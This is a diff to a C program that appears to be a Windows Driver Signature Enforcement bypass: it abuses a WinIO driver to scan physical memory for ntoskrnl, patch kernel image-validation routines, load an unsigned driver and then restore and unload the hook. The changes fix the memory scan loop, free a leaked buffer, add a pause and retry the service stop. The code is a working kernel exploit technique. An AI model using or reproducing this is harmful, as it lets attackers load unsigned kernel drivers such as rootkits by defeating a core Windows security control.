@@ -180,7 +180,7 @@ int main(int argc, char* argv[])
 
 	printf("[*] finding ntoskrnl...\n");
 	u64 ntos_base_pa = 0;
-	for (int i = 0x00000000; i < 0x20000000; i += 0x01000000)
+	for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
 	{
 		char* buf = (char*)malloc(2);
 		read_phys(i, (u64)buf, 2);
@@ -191,6 +191,8 @@ int main(int argc, char* argv[])
 			printf("[*] ntoskrnl @ 0x%p\n", ntos_base_pa);
 			break;
 		}
+
+		free(buf);
 	}
 
 	if (!ntos_base_pa)
@@ -219,6 +221,8 @@ int main(int argc, char* argv[])
 	write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
 	printf("[*] patched validation routines.\n");
 
+	system("pause");
+
 	// start the target driver
 	load_driver_lazy(argv[1], argv[2]);
 	printf("[*] loaded driver!\n");
@@ -229,6 +233,8 @@ int main(int argc, char* argv[])
 	printf("[*] restored validation routines.\n");
 
 	// unload winio driver
+	system("sc stop winio_dse_hook >NUL");
+	Sleep(2000);
 	system("sc stop winio_dse_hook >NUL");
 	system("sc delete winio_dse_hook >NUL");
 	printf("[*] unloaded winio driver.\n");
